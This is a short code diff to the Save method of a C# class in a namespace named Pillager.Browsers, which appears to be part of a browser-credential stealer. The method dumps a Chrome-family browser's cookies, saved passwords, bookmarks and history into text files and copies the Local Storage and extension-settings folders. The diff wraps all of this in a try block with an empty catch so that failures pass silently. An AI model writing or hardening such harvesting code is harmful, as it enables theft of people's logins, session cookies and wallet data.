@@ -205,20 +205,24 @@ namespace Pillager.Browsers
 
         public void Save(string path)
         {
-            if (MasterKey==null) return;
-            string savepath = Path.Combine(path, BrowserName);
-            Directory.CreateDirectory(savepath);
-            string cookies = Chrome_cookies();
-            string passwords = Chrome_passwords();
-            string books = Chrome_books();
-            string history = Chrome_history();
-            if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-            if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-            if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-            if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-            if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
-            if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
-            if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
+            try
+            {
+                if (MasterKey == null) return;
+                string savepath = Path.Combine(path, BrowserName);
+                Directory.CreateDirectory(savepath);
+                string cookies = Chrome_cookies();
+                string passwords = Chrome_passwords();
+                string books = Chrome_books();
+                string history = Chrome_history();
+                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
+                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
+                if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
+                if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
+            }
+            catch { }
         }
     }
 }
